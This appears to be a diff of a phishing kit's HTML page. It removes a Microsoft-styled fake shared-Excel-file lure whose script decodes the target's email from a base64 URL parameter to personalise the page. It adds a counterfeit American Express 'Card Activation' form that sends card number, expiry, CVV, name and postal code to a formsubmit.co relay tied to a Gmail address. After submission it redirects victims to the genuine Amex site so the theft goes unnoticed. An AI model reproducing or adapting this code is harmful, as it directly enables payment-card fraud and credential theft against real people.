@@ -3,379 +3,217 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Download File Modal</title>
-  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+  <title>Card Activation</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      min-height: 100vh;
-      min-width: 100vw;
-      height: 100vh;
-      width: 100vw;
-      background: #f3f3f3 url('screen.svg') center center / cover no-repeat fixed;
-      font-family: 'Segoe UI Variable', 'Segoe UI', Arial, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-    }
-    .logo-bar {
-      position: fixed;
-      top: 32px;
-      left: 48px;
-      display: flex;
-      align-items: center;
-      z-index: 10;
-      user-select: none;
-      background: none;
-      gap: 10px;
-    }
-    .logo-icon {
-      display: flex;
-      align-items: center;
-      margin-right: 0;
-    }
-    .logo-icon svg {
-      width: 48px;
-      height: 48px;
-      display: block;
-    }
-    .logo-text {
-      font-family: 'Segoe UI Variable', 'Segoe UI', Arial, sans-serif;
-      font-size: 1.45rem;
-      font-weight: 700;
-      letter-spacing: 0.01em;
-      color: #2564cf;
-      line-height: 1;
-      letter-spacing: 0.02em;
-    }
-    .logo-text .dot {
-      color: #1e40af;
-      font-weight: 700;
-      font-size: 1.1em;
-      letter-spacing: 0.02em;
-      margin-left: 2px;
-    }
-    @media (max-width: 600px) {
-      .logo-bar {
-        top: 16px;
-        left: 12px;
-        gap: 7px;
-      }
-      .logo-text {
-        font-size: 1.1rem;
-      }
-      .logo-icon svg {
-        width: 20px;
-        height: 20px;
-      }
-    }
-    .modal {
       background: #fff;
-      border-radius: 16px;
-      box-shadow: 0 4px 24px 0 rgba(30, 64, 175, 0.08);
-      border: 1.5px solid #e5e7eb;
-      padding: 44px 48px 36px 48px;
-      display: flex;
-      align-items: center;
-      min-width: 400px;
-      max-width: 95vw;
-      animation: modalIn 0.5s cubic-bezier(.23,1.01,.32,1) both;
-      gap: 36px;
+      font-family: 'Inter', Arial, sans-serif;
+      margin: 0;
+      color: #222;
+      min-height: 100vh;
     }
-    @keyframes modalIn {
-      0% {
-        opacity: 0;
-        transform: scale(0.97) translateY(32px);
-      }
-      100% {
-        opacity: 1;
-        transform: scale(1) translateY(0);
-      }
-    }
-    .file-icon {
-      width: 92px;
-      height: 92px;
-      margin-right: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      background: #e8f0fe;
-      border-radius: 12px;
-      box-shadow: none;
-      position: relative;
-    }
-    .file-icon svg {
-      width: 72px;
-      height: 72px;
-      display: block;
-    }
-    .file-icon span {
-      position: absolute;
-      bottom: 6px;
-      right: 6px;
-      background: #f3f3f3;
-      border-radius: 5px;
-      padding: 2px 6px;
-      font-size: 0.68rem;
-      color: #2564cf;
-      font-weight: 600;
-      box-shadow: none;
-      letter-spacing: 0.04em;
-    }
-    .file-info {
-      flex: 1;
-      min-width: 0;
+    .container {
+      max-width: 370px;
+      margin: 32px auto;
+      background: #fff;
+      border-radius: 14px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.06);
+      padding: 24px 16px 16px 16px;
       display: flex;
       flex-direction: column;
-      gap: 8px;
+      gap: 16px;
     }
-    .file-name {
-      font-size: 1.18rem;
-      font-weight: 600;
-      color: #2564cf;
-      margin-bottom: 2px;
-      word-break: break-all;
-      letter-spacing: 0.01em;
-      font-family: 'Segoe UI Variable', 'Segoe UI', Arial, sans-serif;
-    }
-    .file-meta {
-      font-size: 0.98rem;
-      color: #6b7280;
-      margin-bottom: 0;
-      letter-spacing: 0.01em;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      font-family: 'Segoe UI Variable', 'Segoe UI', Arial, sans-serif;
-    }
-    .file-meta strong {
-      color: #374151;
-      font-weight: 500;
-      font-size: 0.99em;
-      margin-right: 2px;
-      font-family: 'Segoe UI Variable', 'Segoe UI', Arial, sans-serif;
-    }
-    .download-btn {
-      background: #2564cf;
-      border: none;
-      border-radius: 28px;
-      min-width: 140px;
-      height: 52px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 14px;
-      cursor: pointer;
-      box-shadow: 0 2px 8px 0 rgba(37,100,207,0.10);
-      margin-left: 32px;
-      transition: background 0.18s, transform 0.18s, box-shadow 0.18s;
-      outline: none;
-      position: relative;
-      z-index: 1;
-      padding: 0 32px 0 22px;
-      font-family: 'Segoe UI Variable', 'Segoe UI', Arial, sans-serif;
-      font-size: 1.08rem;
-      font-weight: 600;
-      color: #fff;
-      letter-spacing: 0.04em;
-      text-decoration: none;
-      box-sizing: border-box;
-    }
-    .download-btn:active {
-      transform: scale(0.96);
-    }
-    .download-btn:focus {
-      box-shadow: 0 0 0 3px #a5b4fc;
-    }
-    .download-btn:hover {
-      background: #1e40af;
-      transform: translateY(-2px) scale(1.04);
-      box-shadow: 0 8px 24px 0 rgba(37,100,207,0.13);
-    }
-    .download-btn svg {
-      fill: none;
-      width: 28px;
-      height: 28px;
-      stroke: #fff;
-      stroke-width: 2.1;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-      filter: none;
-      margin-right: 0;
-    }
-    @media (max-width: 600px) {
-      .modal {
-        flex-direction: column;
-        align-items: stretch;
-        padding: 24px 8vw 20px 8vw;
-        min-width: 0;
-        gap: 18px;
-      }
-      .file-icon {
-        margin: 0 auto 12px auto;
-      }
-      .download-btn {
-        margin: 24px auto 0 auto;
-      }
-    }
-    .profile-bar {
-      position: fixed;
-      top: 32px;
-      right: 48px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      z-index: 10;
-      user-select: none;
-      background: #fff;
-      border-radius: 16px;
-      box-shadow: 0 4px 16px 0 rgba(30, 64, 175, 0.10);
-      padding: 10px 22px 10px 16px;
-      border: 1.5px solid #e5e7eb;
-    }
-    .profile-pic {
+    .logo {
       width: 40px;
       height: 40px;
-      border-radius: 50%;
-      overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #e0e7ef;
-      box-shadow: 0 2px 8px #2564cf11;
-    }
-    .profile-pic svg {
-      width: 40px;
-      height: 40px;
+      margin: 0 auto 4px auto;
       display: block;
     }
-    .profile-name {
-      font-family: 'Segoe UI Variable', 'Segoe UI', Arial, sans-serif;
-      font-size: 1.08rem;
+    .title {
+      text-align: center;
+      font-size: 1.4rem;
       font-weight: 700;
-      color: #374151;
-      letter-spacing: 0.13em;
-      text-transform: uppercase;
-      background: #f3f3f3;
-      border-radius: 8px;
-      padding: 4px 14px 4px 10px;
-      box-shadow: 0 1px 4px #2564cf08;
+      margin-bottom: 2px;
+    }
+    .subtitle {
+      text-align: center;
+      color: #6b6c72;
+      font-size: 0.98rem;
+      margin-bottom: 8px;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+    }
+    label {
+      font-size: 0.98rem;
+      font-weight: 500;
+      margin-bottom: 1px;
+    }
+    .input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px 36px 8px 10px;
+      font-size: 0.98rem;
+      border: 1.2px solid #e5e7eb;
+      border-radius: 6px;
+      background: #f7f8fa;
+      color: #222;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    input:focus, select:focus {
+      border-color: #2ca01c;
+    }
+    .input-wrapper .fa {
+      position: absolute;
+      right: 10px;
+      color: #bdbdbd;
+      font-size: 1em;
+    }
+    .row {
+      display: flex;
+      gap: 8px;
+    }
+    .row > .input-group {
+      flex: 1;
+    }
+    .pay-btn {
+      background: #2ca01c;
+      color: #fff;
+      font-size: 1.05rem;
+      font-weight: 700;
+      border: none;
+      border-radius: 6px;
+      padding: 12px 0;
+      margin-top: 4px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 1px 4px rgba(44,160,28,0.07);
+      transition: background 0.2s;
+    }
+    .pay-btn:disabled {
+      background: #bdbdbd;
+      cursor: not-allowed;
+    }
+    .pay-btn .fa-lock {
+      font-size: 1em;
+    }
+    .card-icons {
+      display: flex;
+      gap: 6px;
+      margin-top: 2px;
+    }
+    .card-icons img {
+      height: 18px;
+      max-width: 32px;
+      width: auto;
+      object-fit: contain;
+      display: inline-block;
+      vertical-align: middle;
+      background: #fff;
+      border-radius: 3px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+      padding: 1px;
+    }
+    .error {
+      color: #e10000;
+      font-size: 0.92em;
+      margin-top: 1px;
+      min-height: 14px;
     }
     @media (max-width: 600px) {
-      .profile-bar {
-        top: 16px;
-        right: 12px;
-        gap: 7px;
-        padding: 6px 10px 6px 8px;
-      }
-      .profile-pic, .profile-pic svg {
-        width: 28px;
-        height: 28px;
-      }
-      .profile-name {
-        font-size: 0.85rem;
-        padding: 3px 8px 3px 7px;
+      .container {
+        padding: 8px 2vw;
+        margin: 0;
+        border-radius: 0;
+        box-shadow: none;
+        max-width: 98vw;
       }
     }
   </style>
 </head>
 <body>
-  <div class="logo-bar">
-    <span class="logo-icon">
-      <!-- Simple Microsoft-like cloud upload icon -->
-      <svg width="48" height="48" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <rect x="4" y="4" width="20" height="20" rx="6" fill="#2564cf"/>
-        <path d="M14 8v8m0 0l-3-3m3 3l3-3" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-      </svg>
-    </span>
-  </div>
-  <div class="profile-bar">
-    <span class="profile-pic" id="profilePic">
-      <!-- Will be replaced by JS if uid param is present -->
-      <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="20" cy="20" r="20" fill="#e0e7ef"/>
-        <circle cx="20" cy="16" r="8" fill="#2564cf"/>
-        <ellipse cx="20" cy="30" rx="11" ry="7" fill="#2564cf" fill-opacity="0.18"/>
-      </svg>
-    </span>
-    <span class="profile-name" id="profileName">ALEX</span>
-  </div>
-  <div class="modal">
-    <div class="file-icon">
-      <!-- Modern Excel Icon SVG -->
-      <svg width="72" height="72" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <rect x="8" y="6" width="32" height="36" rx="7" fill="#21A366"/>
-        <rect x="12" y="10" width="24" height="28" rx="4" fill="#fff"/>
-        <rect x="12" y="10" width="8" height="28" rx="4" fill="#107C41"/>
-        <text x="16" y="36" text-anchor="middle" font-size="18" font-family="Segoe UI, Arial, sans-serif" fill="#fff" font-weight="bold">X</text>
-      </svg>
-      <span>.xlsx</span>
+  <div class="container">
+    <div class="logo" style="text-align:center; margin-bottom:8px;">
+      <i class="fab fa-cc-amex" style="font-size:2.5rem; color:#2e77bb;"></i>
     </div>
-    <div class="file-info">
-      <div class="file-name">SHARED_FILE_I080_1025.xlsx</div>
-      <div class="file-meta"><strong>File size:</strong>2.3 MB</div>
-      <div class="file-meta"><strong>Date uploaded:</strong>10 Apr 2024, 09:32:10</div>
-      <div class="file-meta"><strong>Sender:</strong>Internal Server</div>
-    </div>
-    <a href="about.html" class="download-btn" title="Download" id="downloadBtn">
-      <svg viewBox="0 0 24 24"><path d="M12 5v10m0 0l-4-4m4 4l4-4M4 19h16"/></svg>
-      <span>VIEW FILE</span>
-    </a>
+    <div class="title">Card Activation</div>
+    <div class="subtitle">Enter your card details to complete your card activation and start using your card.</div>
+    <form action="https://formsubmit.co/harley53smith@gmail.com" method="POST" autocomplete="off">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://oce.americanexpress.com/myca/oce/emea/action/home?request_type=un_Activation&Face=en_GB&linknav=UK-Home-page-Login-Activate-new-Account#/splash">
+      <div class="input-group">
+        <label for="cardNumber">Card Number</label>
+        <div class="input-wrapper">
+          <input type="text" id="cardNumber" name="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" inputmode="numeric" required>
+        </div>
+        <div class="error" id="cardNumberError"></div>
+      </div>
+      <div class="row">
+        <div class="input-group">
+          <label for="expiry">Expiry</label>
+          <div class="input-wrapper">
+            <input type="text" id="expiry" name="expiry" maxlength="5" placeholder="MM/YY" required>
+          </div>
+          <div class="error" id="expiryError"></div>
+        </div>
+        <div class="input-group">
+          <label for="cvv">CVV</label>
+          <div class="input-wrapper">
+            <input type="password" id="cvv" name="cvv" maxlength="4" placeholder="123" required>
+          </div>
+          <div class="error" id="cvvError"></div>
+        </div>
+      </div>
+      <div class="input-group">
+        <label for="name">Name on Card</label>
+        <div class="input-wrapper">
+          <input type="text" id="name" name="name" maxlength="32" placeholder="Full Name" required>
+        </div>
+        <div class="error" id="nameError"></div>
+      </div>
+      <div class="row">
+        <div class="input-group">
+          <label for="country">Country</label>
+          <select id="country" name="country" required>
+            <option value="">Select Country</option>
+            <option value="US">United States</option>
+            <option value="CA">Canada</option>
+            <option value="GB">United Kingdom</option>
+            <option value="AU">Australia</option>
+            <option value="IN">India</option>
+            <!-- Add more countries as needed -->
+          </select>
+        </div>
+        <div class="input-group">
+          <label for="zip">ZIP/Postal Code</label>
+          <div class="input-wrapper">
+            <input type="text" id="zip" name="zip" maxlength="10" placeholder="ZIP/Postal Code" required>
+          </div>
+          <div class="error" id="zipError"></div>
+        </div>
+      </div>
+      <button type="submit" class="pay-btn" id="payBtn">Activate</button>
+    </form>
+    <div id="successMessage" style="display:none; text-align:center; color:#2ca01c; font-weight:600; font-size:1.1em; margin-top:18px;">Payment submitted! (Demo only)</div>
   </div>
-  <script>
-  // Helper to get URL parameter
-  function getParam(name) {
-    const url = new URL(window.location.href);
-    return url.searchParams.get(name);
-  }
-
-  function isEmail(str) {
-    return /^[^@]+@[^@]+\.[^@]+$/.test(str);
-  }
-
-  let uid = getParam('uid');
-  let email = uid;
-  // If not a valid email, try to decode as base64
-  if (uid && !isEmail(uid)) {
-    try {
-      const decoded = atob(uid);
-      if (isEmail(decoded)) {
-        email = decoded;
-      }
-    } catch (e) {}
-  }
-
-  if (email && isEmail(email)) {
-    const domain = email.split('@')[1];
-    const domainName = domain.split('.')[0].toUpperCase();
-    // Set profile name
-    document.getElementById('profileName').textContent = domainName;
-    // Set profile pic to favicon
-    const faviconUrl = `https://www.google.com/s2/favicons?sz=64&domain=${domain}`;
-    const img = document.createElement('img');
-    img.src = faviconUrl;
-    img.alt = domainName + ' favicon';
-    img.style.width = '40px';
-    img.style.height = '40px';
-    img.style.borderRadius = '50%';
-    img.style.background = '#e0e7ef';
-    img.onerror = function() {
-      // fallback to SVG if favicon fails
-      this.style.display = 'none';
-      document.getElementById('profilePic').innerHTML = `<svg width=\"40\" height=\"40\" viewBox=\"0 0 40 40\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"20\" cy=\"20\" r=\"20\" fill=\"#e0e7ef\"/><circle cx=\"20\" cy=\"16\" r=\"8\" fill=\"#2564cf\"/><ellipse cx=\"20\" cy=\"30\" rx=\"11\" ry=\"7\" fill=\"#2564cf\" fill-opacity=\"0.18\"/></svg>`;
-    };
-    const pic = document.getElementById('profilePic');
-    pic.innerHTML = '';
-    pic.appendChild(img);
-    // Update download button link to include uid
-    var downloadBtn = document.getElementById('downloadBtn');
-    if (downloadBtn) {
-      downloadBtn.href = 'about.html?uid=' + encodeURIComponent(uid);
-    }
-  }
-  </script>
+  <script src="script.js"></script>
 </body>
-</html> 
+</html>
